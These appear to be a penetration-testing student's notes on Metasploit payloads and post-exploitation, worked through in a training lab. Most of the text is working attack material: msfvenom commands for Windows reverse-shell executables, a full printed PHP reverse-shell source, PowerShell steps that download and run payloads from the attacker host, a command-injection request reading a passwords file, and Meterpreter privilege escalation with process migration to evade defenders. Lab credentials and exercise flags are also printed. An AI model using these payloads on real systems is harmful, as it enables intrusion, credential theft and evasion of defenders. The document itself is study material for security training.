[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQRJyMNQhfSUwBMmztgdzAQyAjscdwMDNFw1E with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQOXpp4ozPQEJ6EKbPfvrpuGIRzbXwmyoXYxQVWx9oa2dZSsjCtPdi78g7mmdNq0RISDMTN2cwOjcEY_A2hJBLIpnDpXO8MWGQAD_MuYq with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgDPHLdPoMhEJnirOLRuAtP3CQBqzMpU_hDFF_z_Mb7uvUOrHnOtaoKUxxJy-ZymKXvZUpHTzFpKxNT-lUwCLwau33fbhfGL4Juvr38 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgPaHNE6YMDpGuvFDIPjb26MQg5lyvTui5GDm_X7B2aG7IcoivJZzcBK5-0bXx6B41 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAg5oWjPb7WuceRa4-qbWFUAoRMy with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgC_911F with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgyiDXgXWm8yiqgEbvJU8jkN4CIR068EW60YHqvo1FMDjIDxy6X7BqyI_Gt5tJyYfpQPlo0ecRX2E2pDw1VWHy3- with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgRrx-aVGtC9wAd92l77uUxZ8hdH-V8KFbr08B4ycKkPxXOapGLrV5fSc1lscs5JlbU-lfxWjEn1u9tNQgyHnYbLe with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAg6vP9YsLhi4HbqEBe1k6piv62VQhAXpbjsNkEDPz7O3EHpck7QjqZJR95ooC67aGUZ_zCeNxRgRJExXFPAcl_zxf with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgfavQNTnmL6d-8p3ZGZKZ6KmPxob6MEMsICO with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAg9cpXnnAqarXsLgNGM8sqVGUgD6GNqjNsXi-z8nukTBVSGDnceMtmx6E9eJKveMqfOL10GbWeMvFRz0ZQ8XjhBH with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAgrjfc4vmMtrF8wPvwipLVY1a44IYD-gRF1DLrEBce with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAwsQBkokFKilqmmtLfqj3z09Pj24-Xol-GPJ8MmLlbWIFx1ETBiDQJQLM3PVBFoO5NqChBj7j3sltMq0aQnY2 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAwnCQMPU-bR9EIOwrCcLNXIh7OPYBVVTH840SFIuUAkV8OHPMG1iCMNaGn05V9q-IdBcc4jpdvjK7OzwtjIjdZHI-4A5 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAwKgKC97_xft5izfpw3wsLD with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafAw-jHwOffIwagr9ey0YcFd0uOBRt3AYacHdPmOguUhUA-a6qY47Jemj6q8Tj4RE with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Attaching orphaned/stageless session...
[*] Meterpreter session 3 opened (192.168.45.182:8443 -> 192.168.250.16:42094) at 2023-11-21 08:43:46 -0800
[!] This exploit may require manual cleanup of '/tmp/hWykqBce' on the target

meterpreter >
```
- Various events are handled until the Meterpreter session is established.
 - A monitoring defender would ony see regular HTTPS traffic.
 - If they were to check the address of the endpoint (Kali), they would get a HTTP 404.

In a pentest, we can use this payload to improve our chances of bypassing security technologies and defenders.  However, MSF is well known and detection rates of Meterpreter payloads are high.  Therefore we should always attempt to obtain an initial foothold with a raw TCP shell and deploy Meterpreter shell once we have disabled or bypassed security technology.

###### Exercises

Follow the steps from this section and launch the exploit module with the Meterpreter payload payload/linux/x64/meterpreter_reverse_https. Once a session is spawned, use the search command within the Meterpreter command prompt and search for a file named passwords. Display the output of this file to obtain the flag.
```
meterpreter > search -f passwords
Found 1 result...
=================

Path            Size (bytes)  Modified (UTC)
----            ------------  --------------
/opt/passwords  37            2023-11-21 07:26:19 -0800

meterpreter > cat /opt/passwords
OS{fc62308419a67ed9611856e6a116c11d}
```


##### Executable Payloads

Metasploit can also export payloads into various types of files, Win bins, Linux bins, and webshells for example.  Metasploit contains [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) as a standalone tool for generating these payloads.  It provides standardized command options and various techniques to customize payloads.

To get familiar with msfvenom we'll create a mal Win bin that starts a raw TCP rev shell.  Let's start by listing all payloads with `-l` and arg `payloads`.  We will also pass `--platform` and `--arch`.
```
kali@kali:~$ msfvenom -l payloads --platform windows --arch x64 

...
windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
...
windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a command shell (Windows x64)
...
```
- We can choose between stages and non-staged payloads.
 - We will use non-staged payload first.

Now we use the `-p` flag to set the payload, set `LHOST`, and `LPORT` to assign host and port for the rev shell conn, `-f` to set the output format to `exe`, and `-o` to specify the output file name.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: nonstaged.exe
```

Now that we have created out mal bin, let's use it.  First we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user `justin` and password `SuperS3cure1337#`.  Then start PowerShell to transfer the file and exec.
```
PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe

PS C:\Users\justin> .\nonstaged.exe
```

Once exec, we return to our Netcat listener.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.226.202] 60800
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Users\justin>
```

Now we will use a staged payload to perform the same action.  We again use msfvenom to create the staged TCP reverse shell payload.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: staged.exe
```

We received an incoming conn, but cannot exec any commands.  This is because Netcat does not know how to handle the staged payload.
```
kali@kali:~$ nc -nvlp 443                                                                                
listening on [any] 443 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50832
whoami
```

To get a functional interactive command prompt we must use Metasploit's [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/) module, which works for most staged, non-staged, and more advanced payloads.

In Metasploit, let's select the module with `use`, then specify the payload of our incoming conn, `windows/x64/shell/reverse_tcp` in this case.  In addition, we set the opions for th payload.  Enter the IP of our Kali machine as `LHOST` and port 443 for `LPORT`, then under `run` to launch the mod.
```
msf6 > workspace -a execpayloads
[*] Added workspace: execpayloads
[*] Workspace: execpayloads
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, proc
                                        ess, none)
   LHOST                      yes       The listen address (an interface may be specifi
                                        ed)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 192.168.45.182
LHOST => 192.168.45.182
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.45.182:443 
```

With our listener running we can start the `staged.exe` on BRUTE2, our multi/handler receives the incoming staged payload and provides an interactive shell in the context of a `session`.
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.45.182:443 
[*] Sending stage (336 bytes) to 192.168.226.202
[*] Command shell session 1 opened (192.168.45.182:443 -> 192.168.226.202:60810) at 2023-11-22 07:17:20 -0800


Shell Banner:
Microsoft Windows [Version 10.0.20348.169]
-----
          

C:\Users\justin>whoami
whoami
brute2\justin

C:\Users\justin>
```
- For staged and advanced payloads, i.e. Meterpreter, we must use multi/handler.

Using `run` without any args will block the command prompt until exe finishes or we background the session.  As we learned previously, we can use `run -j` to start the listener in the background, allowing us to continue other work while we wait for the conn.  We can use the `jobs` command to get a list of currently active jobs, like listeners waiting for conn.

Exit out session and restart with `run -j`, then list currently active jobs using `jobs`, once we exec staged.exe MSF will notify us that a new session was created.
```
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.45.182:443 
msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                        Payload opts
  --  ----                    -------                        ------------
  0   Exploit: multi/handler  windows/x64/shell/reverse_tcp  tcp://192.168.45.182:443

msf6 exploit(multi/handler) > 
[*] Sending stage (336 bytes) to 192.168.226.202
[*] Command shell session 2 opened (192.168.45.182:443 -> 192.168.226.202:60816) at 2023-11-22 07:22:16 -0800

msf6 exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type               Information                  Connection
  --  ----  ----               -----------                  ----------
  2         shell x64/windows  Shell Banner: Microsoft Win  192.168.45.182:443 -> 192.1
                               dows [Version 10.0.20348.16  68.226.202:60816 (192.168.2
                               9] -----                     26.202)

msf6 exploit(multi/handler) >
```
- MSF created a new session for the incoming conn.
 - Interact with `sessions -i` passing the session ID as arg.

We can use msfvenom generated payloads in various situations during a pen test.
- Create exec files, transfer to target, and start rev shell.
 - PowerShell scripts.
 - Win exe.
 - Linux executables.
- Create web shells to exploit web app vulns.
- Use generated files as part of a client side attack.

###### Exercises

Follow the steps from this section and use msfvenom to create a Windows binary with a staged TCP reverse shell payload. Start a multi/handler within Metasploit to receive the staged reverse shell from VM #1 once you execute the executable file on the system. Enter the command to list all payloads of msfvenom.
```
msfvenom -l payloads
```

Use msfvenom to create a PHP web shell (bind or reverse shell), rename the PHP file extension to .pHP (as we did in the Module "Common Web Application Attacks" in the section "Using Executable Files"), and upload it to VM #2 to obtain an interactive shell. The flag is located in C:\xampp\passwords.txt.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php    
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2957 bytes
Saved as: webrevshell.php
                                                                                         
┌──(operator@labhost)-[~/OffSec/msf]
└─$ ls          
modrc  nonstaged.exe  staged.exe  webrevshell.php
                                                                                         
┌──(operator@labhost)-[~/OffSec/msf]
└─$ cat webrevshell.php 
    /*<?php /**/
      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){
        $dis=preg_replace('/[, ]+/',',',$dis);
        $dis=explode(',',$dis);
        $dis=array_map('trim',$dis);
      }else{
        $dis=array();
      }
      
    $ipaddr='192.168.45.182';
    $port=443;

    if(!function_exists('QuMOnN')){
      function QuMOnN($c){
        global $dis;
        
      if (FALSE !== stristr(PHP_OS, 'win' )) {
        $c=$c." 2>&1\n";
      }
      $MEDV='is_callable';
      $reLY='in_array';
      
      if($MEDV('shell_exec')&&!$reLY('shell_exec',$dis)){
        $o=`$c`;
      }else
      if($MEDV('system')&&!$reLY('system',$dis)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($MEDV('proc_open')&&!$reLY('proc_open',$dis)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($MEDV('popen')&&!$reLY('popen',$dis)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($MEDV('exec')&&!$reLY('exec',$dis)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($MEDV('passthru')&&!$reLY('passthru',$dis)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      {
        $o=0;
      }
    
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://192.168.45.182",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=QuMOnN(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=QuMOnN(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
	

┌──(operator@labhost)-[~/OffSec/msf]
└─$ urlencode '(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell'

%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
                                                                                         
┌──(operator@labhost)-[~/OffSec/msf]
└─$ urlencode 'iwr -uri http://192.168.45.182/webrevshell.php -Outfile webrevshell.pHP'
iwr%20-uri%20http%3A%2F%2F192.168.45.182%2Fwebrevshell.php%20-Outfile%20webrevshell.pHP

┌──(operator@labhost)-[~/OffSec/msf]
└─$ urlencode 'Rename-Item -Path webrevshell.pHP -NewName webrevshell.php'
Rename-Item%20-Path%20webrevshell.pHP%20-NewName%20webrevshell.php


curl -i -s -k -X $'POST' \
    -H $'Host: 192.168.226.189:8000' -H $'Content-Length: 60' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://192.168.226.189:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://192.168.226.189:8000/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    --data-binary $'Archive=git+--help%3B+cat+..\\..\\..\\..\\..\\xampp\\passwords.txt' \
    $'http://192.168.226.189:8000/archive'


##### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) SuperPassword (For everything):
   User: mountainadmin
   Password: OS{bf12259a466c7e76928a797bc1f7e508}
   Attention: This user can do everything in our company.. Use with care!
```

#### 20.3 Performing Post-Exploitation with Metasploit
 
- Use core Meterpreter post-exploitation features.
- Use post-exploitation modules.
- Perform pivoting with Metasploit.

##### Core Meterpreter Post-Exploitation Features

We used Meterpreter payloads to navigate the FS in the prior section, obtaining info about the target sys, and transftering files to/from our attacking machine.  Apart from these, Meterpreter also contains numerous post-exploitation features.

Let's explor these features, note that the Linux Mterpreter payload contains less post-exploitation features than the Windows version.  Therefore we will explore these on Win target ITWK01.  Let's assume we already gained an initial foothold on the target system and deployed a bind shell to access the system.

First, we'll create a Win bin with msfvenom containing a non-staged Meterpreter payload names `met.exe`
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201820 bytes
Final size of exe file: 208384 bytes
Saved as: met.exe
```

Then we launch multi/handler, set options, and run.
```
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set LHOST 192.168.45.182
LHOST => 192.168.45.182
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter_reverse_https):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, pr
                                          ocess, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       192.168.45.182   yes       The local listener hostname
   LPORT       443              yes       The local listener port
   LURI                         no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.45.182:443
```

Next we start a Python3 web server, serve `met.exe`, conn to our bind shell, download our mal exe with PowerShell, and start the bin.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ nc $IT 4444 
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Users\luiza>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\luiza> iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
PS C:\Users\luiza> .\met.exe
.\met.exe
PS C:\Users\luiza>
```

Metasploit notifes us that a new session has been opened.
```
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: 7unirfs7) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv68pQG2EEFr with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: 7unirfs7) Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened (192.168.45.182:443 -> 192.168.226.223:52494) at 2023-11-23 10:16:41 -0800

meterpreter >
```

Now that we have an active Meterpreter session on a Win target we can start exploring our port-exploitation commands/features.

The first post command we use is `idletime`, which displays how long a user has been idle.  After obtaining basic info about the current user and OS, this should be one of our first commands as it indicated if the target sys is currently in use.
```
meterpreter > getuid
Server username: ITWK01\luiza
meterpreter > sysinfo
Computer        : ITWK01
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter > idletime 
User has been idle for: 26 mins 21 secs
meterpreter >
```

The output states that the user has not interacted with the sys for over 26 min, suggesting they stepped away from their computer.  If the results of idletime indicated the user is away, we can take this as an opportunity to exec programs or commands which may display a cli-window, CMD or PS, for a moment.

Several post-exploitation features need admin privs to exec, Metasploit contains a `getsystem` command, that attempts to auto PrivEsc to NT AUTHORITY\SYSTEM.  It utlizes various techniques using named pipe impersonation and token duplication.  In default settings, `getsystem` uses all available techiniques shown in the help menu, attempting to leverage SeImersonatePrivilege and SeDebugPrivilege.

Before we exec `getsystem` let's start an interactive shell and confirm that our user has one of those two privs assigned.
```
meterpreter > shell
Process 1264 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Users\luiza>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Users\luiza>exit
exit
meterpreter >
```
- User `luiza` has SeImpersontePrivilege assigned.

Now let's use `getsystem` to attempt to elevate our privs.
```
meterpreter > getuid
Server username: ITWK01\luiza

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
- `getsystem` elevated our privs to NT AUTHORITY\SYSTEM by using Named Pipe Impersonation (Print Spooler variant) as we did manually in the Windows Privilege Escalation Module.

Another important post module feature is `migrate`.  When we compromise a host, our Meterpreter payload is executed inside the process of the application we attack or exec our payload.  If the victim stops that process we loose our access to the machine.  Also, depending on how the binary file containing the Meterpreter payload is named, the proc may appear suspiscious to a defender searching through proc list.  We can use migrate to move the execution of our Meterpreter payload to a different proc.

We can view all running procs with `ps` in the Meterpreter prompt.
```
meterpreter > ps

Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----
 2012   8500  met.exe                      x64   0        ITWK01\luiza                  C:\Users\luiza\met.exe 
... 
 5292   4892  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...
```
- The proc `met.exe` has the proc ID 2012.
- The name and path will stand out to a reviewing defender.

The output shows `offsec` started a proc related to OneDrive with proc ID 5292.  If our payload runs in this proc, it will be less likely to be detected by reviewing the proc list.

We should be aware that we are only able to migrate into a proc that executes at the same (or lower) integrity and priv level than of our current proc.  In the context of this example, we already gained NT AUTHROTIY/SYSTEM so we have numerous choices.

Let's migrate our current proc into the `OneDrive.exe` of the user `offsec` by entering `migrate` and the proc ID we want to migrate to.
```
meterpreter > migrate 5292
[*] Migrating from 2012 to 5292...
[*] Migration completed successfully.
meterpreter > ps

Process List
============
 PID   PPID  Name                         Arch  Session  User                Path
 ---   ----  ----                         ----  -------  ----                ----
...
 2440   668   svchost.exe
 2472   668   svchost.exe
 2496   668   svchost.exe
 2568   668   svchost.exe
 2624   668   spoolsv.exe
 2660   668   svchost.exe
 2784   668   svchost.exe
 2928   668   svchost.exe
...
```
- We succesfully migrated our proc to the OneDrive proc.

When we review the proc list, our original `met.exe` proc doesn't exist anymore.  Further, we notice that `ps` output contains less info than before.  Reason being, we are now running in the context of the proc with the ID 8052 and therefore as user `offsec`.
```
meterpreter > getuid
Server username: ITWK01\offsec
```

Instead of migrating to an existing proc or situation in which we won't find a suitable proc for migration, we can use the `execute` Meterpreter command.  This command procides the ability to create a new proc, specifying a command or program.

To demonstrate, let's start a hidden Notepad proc and migrate to it as user `offsec`.  We use `execute` with `-H` to create the proc hidden from view and `notepad` as arg for `-f` to specify the command or program to run, then migrate to the spawned proc.
```
meterpreter > execute -H -f notepad
Process 3500 created.
meterpreter > migrate 3500
[*] Migrating from 5292 to 3500...
[*] Migration completed successfully.
meterpreter >
```
- Shows we migrated to the newly spawned Notepad proc.
 - Spawned without GUI, `-H`
  - Still listed in the proc list.

*Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machine's desktop in real-time.*

###### Exercises

Follow the steps from this section to migrate to the OneDrive.exe process of user offsec. Then, use the Meterpreter post-exploitation feature getenv to display the value of the environment variable Flag and enter it as answer to this exercise.
```
meterpreter > migrate 7092
[*] Migrating from 3500 to 7092...
[*] Migration completed successfully.
meterpreter > getenv
[-] None of the specified environment variables were found/set.
meterpreter > getuid
Server username: ITWK01\offsec
meterpreter > getenv Flag

Environment Variables
=====================

Variable  Value
--------  -----
Flag      thisistheanswertothequestion
```


##### Post-Exploitation Modules

In addition to the core functions of Meterpreter, there are several post modules we can deploy against an active session.

Sessions created through attack vectors, the execution of a client side attck for instance, will likely only provide us with an unpriv shell.  If the target user is a member of the local admin group, we can elevate our shell to a high integrity level if we can bypass [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works).

In the previous section we migrated Meterpreter to a OneDrive.exe proc, preumably running at medium integrity.  For this section repeat the steps from the prior section and then bypass UAC with a Metasploit post module to obtain a session in the context of a high integrity level proc.

We first connect to the bind shell on port 4444 of TKWK01, download `met.exe`, and enter `getsystem` to elev privs.  Then use `ps` to identify the proc ID of OneDrive.exe and `migrate` to it.

Connect to bind shell and exev our binary.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ nc $IT 4444
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

